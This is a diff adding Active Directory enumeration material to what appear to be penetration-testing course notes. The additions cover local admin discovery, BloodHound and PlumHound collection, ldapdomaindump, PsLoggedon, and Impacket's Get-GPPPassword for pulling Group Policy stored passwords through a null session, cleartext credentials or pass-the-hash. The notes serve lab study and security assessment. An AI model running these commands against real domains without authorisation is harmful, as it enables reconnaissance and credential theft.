@@ -20,6 +20,10 @@ net group /domain
 ```
 net group <GROUP_NAME> /domain
 ```
+- Check local admins with
+```
+net localgroup Administrators
+```
 ### 21.2.2 Enumerating Active Directory Using PowerShell and .NET Classes
 - Because there can be multiple DCs in a domain it is important to find the Primary Domain Controller (PDC)
 	- There can only be one of these per domain and it holds the PdcRoleOwner property
@@ -103,6 +107,10 @@ Get-NetGroup "<GROUPNAME>" | select member
 - Find vulnerable operating systems 
 ```
 Get-NetComputer | select operatingsystem,operatingsystemversion
+```
+- Scan the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
+```
+Find-LocalAdminAccess
 ```
 ### 21.3.2 Getting An Overview - Permissions and Logged On Users
 - You may not want to go straight to domain admins because that is suspicious
@@ -265,6 +273,11 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desk
 - The cache file speeds up the process 
 	- For example if a user logged on after we collectedd a snapshot we would have missed it in our snapshot but we will not miss it with the looping functionality
 		- NOT NEEDED FOR THE TEST 
+- Bloodhound-python
+```
+bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c all
+#Output saved in kali machine
+```
 ### 21.4.2 Analyzing Data Using BloodHound
 - Run neo4j with 
 ```
@@ -283,6 +296,47 @@ bloodhound
 - Then focus on the shortest paths shown in the Analysis tab
 	- This shows the shortest path to domain admin
 	- In a relationship click the line between nodes and click ?help and BloodHound will show additional information
-## Exercises To-Do
-
-- [ ] 2.1.1 (page 20)
+## LDAPDOMAINDUMP
+- These files contain information in a well structured webpage format
+```
+sudo ldapdomaindump ldaps://<IP> -u '<USERNAME>' -p '<PASSWORD>'
+```
+## PlumHound
+- Link: [https://github.com/PlumHound/PlumHound](https://github.com/PlumHound/PlumHound) install from the steps mentioned.
+- Keep both Bloodhound and Neo4j running as this tool acquires information from them.
+```
+sudo python3 plumhound.py --easy -p <NEO4JPASSWORD>
+```
+```
+python3 plumhound.py -x tasks/default.tasks -p <NEO4jPASSWORD>
+```
+```
+firefox index.html
+```
+## PingCastle
+- [www.pingcastle.com](http://www.pingcastle.com/) - Download Zip file from here.
+- This needs to be run on windows machine, just hit enter and give the domain to scan.
+- It gives a report at end of scan.
+## PsLoggedon
+- Check to see user logons at remote system of a domain
+```
+.\PsLoggedon.exe \\<COMPUTERNAME>
+```
+## GPP or CPassword
+- Impacket tools
+- With a NULL session
+```
+Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+```
+- With cleartext credentials
+```
+Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+```
+- Pass the hash (NT Hash)
+```
+Get-GPPPassword.py -hashes:'NTHASH' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+```
+- Parse a local file
+```
+Get-GPPPassword.py -xmlfile '/path/to/policy.xml' 'LOCAL'
+```
